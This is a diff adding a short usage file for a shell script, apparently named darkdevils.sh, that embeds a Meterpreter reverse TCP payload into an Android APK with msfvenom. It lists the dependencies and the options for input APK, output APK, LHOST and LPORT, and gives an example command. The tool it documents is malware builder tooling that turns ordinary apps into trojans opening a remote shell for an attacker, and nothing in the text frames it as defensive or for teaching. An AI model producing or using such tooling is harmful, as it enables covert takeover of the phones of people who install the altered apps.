@@ -1,0 +1,15 @@
+Description: This script embeds a Meterpreter reverse TCP payload into an APK file using msfvenom.
+
+Dependencies:
+  - Kali Linux
+  - msfvenom
+
+Usage:
+  - Execute the script with the following options:
+    -a <input_apk_file>: Path to the input APK file.
+    -u <output_apk_file>: Path to save the output APK file.
+    -l <LHOST>: Local host IP address for the Meterpreter reverse TCP payload.
+    -p <LPORT>: Local port for the Meterpreter reverse TCP payload.
+
+Example:
+  ./darkdevils.sh -a input.apk -u output.apk -l 192.168.1.10 -p 4444
